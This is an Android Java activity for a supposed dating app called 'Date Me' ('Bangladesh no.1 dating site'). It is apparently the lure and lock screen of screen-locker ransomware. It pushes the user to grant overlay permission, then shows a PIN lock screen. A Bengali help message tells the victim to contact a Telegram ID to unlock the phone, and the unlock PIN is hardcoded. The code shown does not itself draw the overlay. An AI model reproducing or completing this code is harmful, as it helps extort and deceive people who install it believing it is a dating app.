package com.datetime.dateme;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.*;

public class MainActivity extends Activity {
    private final Handler handler = new Handler();
    private FrameLayout root;
    private boolean permissionRequested = false;
    private static final String PIN = "58460";

    @Override public void onCreate(Bundle b) {
        super.onCreate(b); requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        showWelcome();
    }

    private TextView tv(String text, float size) {
        TextView v = new TextView(this); v.setText(text); v.setTextSize(size); v.setTextColor(Color.WHITE); v.setGravity(Gravity.CENTER); return v;
    }

    private void showWelcome() {
        root = new FrameLayout(this);
        ImageView bg = new ImageView(this); bg.setImageResource(com.datetime.dateme.R.drawable.welcome_bg); bg.setScaleType(ImageView.ScaleType.CENTER_CROP); root.addView(bg, -1, -1);
        View shade = new View(this); shade.setBackgroundColor(0x33000000); root.addView(shade, -1, -1);

        LinearLayout center = new LinearLayout(this); center.setOrientation(LinearLayout.VERTICAL); center.setGravity(Gravity.CENTER); center.setPadding(24,0,24,0);
        FrameLayout heartBox = new FrameLayout(this);
        ImageView heart = new ImageView(this); heart.setImageResource(R.drawable.heart); heart.setScaleType(ImageView.ScaleType.FIT_CENTER); heartBox.addView(heart, new FrameLayout.LayoutParams(250,220));
        TextView click = tv("Click Me", 30); click.setTypeface(null, android.graphics.Typeface.BOLD); heartBox.addView(click, new FrameLayout.LayoutParams(250,220));
        center.addView(heartBox, new LinearLayout.LayoutParams(250,220));
        TextView sub = tv("Bangladesh no.1 dating site", 13); sub.setAlpha(.9f); LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(-2,50); sp.gravity=Gravity.CENTER; center.addView(sub,sp);
        root.addView(center, new FrameLayout.LayoutParams(-1,-1));
        heartBox.setOnClickListener(v -> onClickMe());
        setContentView(root);
    }

    private void onClickMe() {
        if (!Settings.canDrawOverlays(this)) {
            permissionRequested = true;
            try { startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:"+getPackageName()))); }
            catch(Exception e){ startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)); }
            Toast.makeText(this,"Display over other apps permission দিন",Toast.LENGTH_LONG).show();
        } else showPinScreen();
    }

    @Override protected void onResume() { super.onResume(); if(permissionRequested && Settings.canDrawOverlays(this)){ permissionRequested=false; showPinScreen(); } }

    private void showPinScreen() {
        root.removeAllViews();
        root.setBackgroundColor(Color.rgb(14,14,18));
        LinearLayout box = new LinearLayout(this); box.setOrientation(LinearLayout.VERTICAL); box.setGravity(Gravity.CENTER); box.setPadding(32,40,32,40); box.setBackgroundResource(R.drawable.panel_bg);
        TextView title=tv("Date Me",30); box.addView(title,new LinearLayout.LayoutParams(-1,70));
        TextView info=tv("Enter PIN to continue",17); box.addView(info,new LinearLayout.LayoutParams(-1,55));
        EditText pin=new EditText(this); pin.setInputType(2|16); pin.setHint("PIN"); pin.setGravity(Gravity.CENTER); pin.setTextColor(Color.BLACK); pin.setHintTextColor(Color.GRAY); pin.setBackgroundResource(R.drawable.edit_bg); box.addView(pin,new LinearLayout.LayoutParams(-1,60));
        Button ok=new Button(this); ok.setText("UNLOCK"); box.addView(ok,new LinearLayout.LayoutParams(-1,58));
        TextView help=tv("?",24); help.setBackgroundColor(0x44000000); LinearLayout.LayoutParams hp=new LinearLayout.LayoutParams(55,55); hp.gravity=Gravity.CENTER; box.addView(help,hp);
        TextView msg=tv("",13); msg.setVisibility(View.GONE); msg.setPadding(8,12,8,12); box.addView(msg,new LinearLayout.LayoutParams(-1,70));
        root.addView(box,new FrameLayout.LayoutParams(-1,-2,Gravity.CENTER));
        help.setOnClickListener(v->{ msg.setText("ফোনটি আনলক করতে @happyboy1299 টেলিগ্রাম আইডিতে মেসেজ দিন।"); msg.setVisibility(View.VISIBLE); handler.removeCallbacksAndMessages(msg); handler.postDelayed(()->msg.setVisibility(View.GONE),5000); });
        ok.setOnClickListener(v->{ if(PIN.equals(pin.getText().toString())){ box.removeAllViews(); TextView thanks=tv("ধন্যবাদ",28); box.addView(thanks,new LinearLayout.LayoutParams(-1,80)); Button close=new Button(this); close.setText("×"); box.addView(close,new LinearLayout.LayoutParams(-1,60)); close.setOnClickListener(x->showWelcome()); } else Toast.makeText(this,"ভুল PIN",Toast.LENGTH_SHORT).show(); });
    }
}
